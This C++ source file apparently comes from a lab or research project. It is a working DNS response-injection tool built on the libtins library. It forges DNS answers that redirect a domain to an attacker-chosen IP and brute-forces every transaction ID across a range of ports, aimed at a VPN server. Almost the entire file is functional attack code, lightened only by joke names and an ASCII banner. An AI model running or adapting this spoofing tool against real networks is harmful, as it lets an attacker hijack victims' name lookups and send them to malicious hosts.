#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <string>
#include <unistd.h>
#include <thread>
#include <random>



using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;



int current_spoof_port, best_port, chack_count, resp_count, sniff_size;
bool is_running = true;
bool verbose = true;
bool count_resp = false;


bool scanning = false;
bool injecting = false;
bool sniffed_resp = false;
string dest_ip;
string source_ip;

void print_start() {
  cout << "meep\n";
  usleep(1000000 / 2);
  cout << "meep\n";
  usleep(1000000 /2);
  cout << R"(

                                    __
                                   /  \      __
       .---.                  _   /   /   _.~  \
       \    `.               / \ /   /.-~    __/
        `\    \              |  |   |/    .-~ __
          \    \             |  |   |   .'--~~  \
           \    \            |  |   `  ' _______/
            \    \           |  `        /
        .--. \    \          |    `     /
        \   `.\    \          \        /
         `\   \     \          `\     (
           \   \     \           > ,-.-.
            \   `.    \         /  |  \ \
             \    .    \       /___| O |O\     ,
          .-. \    ;    |    /`    `^-.\.-'`--'/
          \  `;         |   |                 /
           `\  \        |   `.     `--..____,'
             \  `.      |     `._     _.-'^
              \   .     /         `|`|`
            .-.\       /           | |
            \  `\     /            | |
             `\  `   |             | |
               \     |             | |
              .-.    |             | |
              \  `.   \            | |
               `\      \           | |
                 \      \          | |
                  \_____ :-'~~~~~'-' ;
                  /____;``-.         :
                 <____(     `.       ;
                   \___\     ;     .'
                      /``--'~___.-'
                     /\___/^/__/
                    /   /' /`/'
                    \  \   `\ \
                     `\ \    \ \
                       \ \    \ \
                        \ \    \ \
                         \ \    \ \     ______
                          \ \ ___\ \'~``______)>
                           \ \___ _______ __)>
                       _____\ \'~``______)>
                     <(_______.._______)>


)";
  usleep(1000000);

}
void print_divider(int count) {
  int i = 0;
  while (i < count) {
    if (verbose) cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    i++;
  }
}

void print_time() {
  int res = system("date");

}

// Attempt to inject the dns response to the given 4 tuple (src_ip, sport, dest_ip, dport)
// while cycling through all possible txIDs for the dns reply
int send_dns(string src_ip, int sport, string dest_ip, int dport) {

  PacketSender sender;
  NetworkInterface iface("enp0s8");

  IP pkt = IP(dest_ip, src_ip) / UDP(dport, sport) / DNS();

  cout << "Attempting to inject dns response on port " << dport << "\n\n";

  string spoof_domain = "www.fartbook.com"; // twatter.com
  string redirect_ip = "192.168.2.2";

  // This needs to be the same IP as the VPN server for the connection
  // to get routed back to the victim

  injecting = true;

  // Add the fake response
  pkt.rfind_pdu<DNS>().add_query({ spoof_domain, DNS::A, DNS::IN });
  pkt.rfind_pdu<DNS>().add_answer(
    DNS::resource(
      spoof_domain,
      redirect_ip, // some bad guy IP we wanna redirect to
      DNS::A,
      1, // class of the record??
      // 777 is just a random TTL
      777
    )
  );
  // We want the query to be resolverd recursively
  pkt.rfind_pdu<DNS>().type(DNS::QRType::RESPONSE);
  pkt.rfind_pdu<DNS>().recursion_desired(1);
  pkt.rfind_pdu<DNS>().recursion_available(1);

  int round_sends = 0;
  int id = 1;
  int num_blocks = 6;
  int block_size = int(65535 / num_blocks); // 65535 is max transaction id for dns 


  while (id < block_size) { // try every txId in the block

    int send_id = id;

    while (round_sends < num_blocks) { // send once to each block
      pkt.rfind_pdu<DNS>().id(send_id); // set the transaction id guess
      sender.send(pkt, iface);
      send_id += block_size;
      round_sends ++;
    }

    if (id % 1000 == 0) cout << "sending dns response w id: " << id << "\n";
    id ++;
    round_sends = 0;

    usleep(10); // was working 100% w 250
  }
  return 1;

}

int find_ports(string source_ip, int sport, string dest_ip, int start_port, int end_port) {

  for (int port=start_port; port < end_port; port++) {
      print_time();
      send_dns(source_ip, sport, dest_ip, port);
      usleep(10);
      print_divider(1);
    }
  return 1;
}

int main(int argc, char** argv) {

  if (argc != 6) {
    cout << "sike wrong number of args ---> (source_ip, sport, dest_ip, start_port, end_port)\n";
    return 0;
  }

  source_ip = argv[1]; // dns server IP
  int sport = atoi(argv[2]); // most likely 53
  dest_ip = argv[3]; // vpn server IP
  //verbose = true;

  int start_port = atoi(argv[4]); // Linux ephemeral range is (32768, 60999)
  int end_port = atoi(argv[5]);

  print_divider(2);

  int res = find_ports(source_ip, sport, dest_ip, start_port, end_port);

  return 1;
}
